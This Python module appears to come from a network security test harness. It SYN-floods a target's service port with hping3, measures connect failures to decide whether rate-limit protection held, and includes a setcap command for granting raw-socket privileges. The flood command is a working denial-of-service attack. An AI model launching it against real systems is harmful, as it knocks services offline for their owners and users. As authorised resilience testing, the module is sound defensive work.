"""SYN Flood (DoS). Tests rate-limit / DoS protection against a TCP SYN flood —
a different limiter than the ICMP flood. hping3 SYN-floods an open service port
while TCP-connect success to that port is sampled; a high connect-failure rate
during the flood means the flood degraded service.

Requires root (hping3 raw socket) — grant once:
  sudo setcap cap_net_raw,cap_net_admin+eip $(which hping3)
Live, disruptive — only inside an authorised maintenance window. Linux only.
"""
import os
import socket
import subprocess
import time

FLOOD_SECONDS = 12
SYN_PORT = int(os.environ.get("HARNESS_SYN_PORT", "80"))
SAMPLES = 15
FAIL_THRESHOLD = 30   # % failed connects during the flood == real DoS impact

META = {
    "id": "syn_flood",
    "name": "SYN Flood (DoS)",
    "category": "Network Exploitation",
    "test_type": "dos",
    "added": True,   # added after the initial harness set
    "control": "Rate-limit / DoS protection (SYN)",
    "fix": "SD-WAN",
    "mitre": ['T1498.001'],
    "cwe": ['CWE-400'],
    "tactic": 'Impact',
    "requires": ["hping3", "timeout"],
    "needs_root": True,           # hping3 needs a raw socket (root or CAP_NET_RAW)
    "serial": True,               # DoS: must run alone
    "os_supported": ["Linux"],
    "ports": [("tcp", SYN_PORT)],
    "port_customizable": True,
    "success_regex": r"^PASS",
    # a privilege failure must NOT read as "control held" (flood never ran)
    # INFO/INCONCLUSIVE are NOT a control win (one host rarely saturates a target)
    # -> NO-RESULT. Only a genuine network-layer block is BLOCKED.
    "blocked_regex": r"No route to host|Network is unreachable|host unreachable",
}

_PRIV_ERR = ("operation not permitted", "raw socket", "permission denied",
             "a password is required", "a terminal is required", "sudo:")


def _connect_ok(host, port, timeout=1.5):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def run(target, ctx):
    port = ctx.get_port("syn_flood", SYN_PORT)   # overridable (HARNESS_PORT_SYN / GUI)
    out = [f"# SYN flood DoS vs {target}:{port}  "
           f"({FLOOD_SECONDS}s flood, {SAMPLES} connect samples)"]

    # BASELINE: the DoS signal is "connects that WORKED before now fail during the
    # flood". If nothing is listening on the port to begin with, every sample would
    # fail for a reason that has nothing to do with the flood -> a false "DoS
    # effective (100%)". So require the port open at baseline before measuring.
    if not _connect_ok(target, port):
        out.append(f"INCONCLUSIVE: no service listening on {target}:{port} at baseline "
                   "— cannot measure SYN-flood impact (connect failures wouldn't be "
                   "caused by the flood). Pick an open service port (HARNESS_PORT_SYN / GUI).")
        return "\n".join(out)

    # elevate hping3 via `sudo -n` (never prompts) when not root, so a per-command
    # NOPASSWD rule for hping3 works without running the whole harness as root.
    import core
    flood_cmd = ["timeout", str(FLOOD_SECONDS)] + core.sudo_prefix() + \
                ["hping3", "-S", "-p", str(port), "--flood", target]
    try:
        flood = subprocess.Popen(
            flood_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    except FileNotFoundError:
        return "\n".join(out) + "\n[ERROR] hping3 not found (install hping3). INCONCLUSIVE"

    time.sleep(1)  # let the flood ramp before sampling
    fails = 0
    for _ in range(SAMPLES):
        if not _connect_ok(target, port):
            fails += 1
        time.sleep(0.3)

    try:
        fout, _ = flood.communicate(timeout=FLOOD_SECONDS + 5)
    except Exception:
        flood.kill()
        fout, _ = flood.communicate()

    if fout and any(m in fout.lower() for m in _PRIV_ERR):
        out.append(f"hping3 output: {fout.strip()[:200]}")
        out.append("FLOOD-PRIV-ERROR: hping3 could not run with the privileges it "
                   "needs — the flood never ran. NOT evidence the control works. "
                   "Fix any ONE of: setcap cap_net_raw,cap_net_admin+eip "
                   "$(which hping3); a NOPASSWD sudoers rule for hping3; or run as root.")
        return "\n".join(out)

    loss = 100.0 * fails / SAMPLES
    if loss > FAIL_THRESHOLD:
        out.append(f"PASS: DoS effective — {loss:.0f}% of TCP connects to "
                   f"{port} failed during the flood")
    else:
        out.append(f"INFO: {loss:.0f}% connect failure (below {FAIL_THRESHOLD}% "
                   "threshold — control likely held)")
    return "\n".join(out)
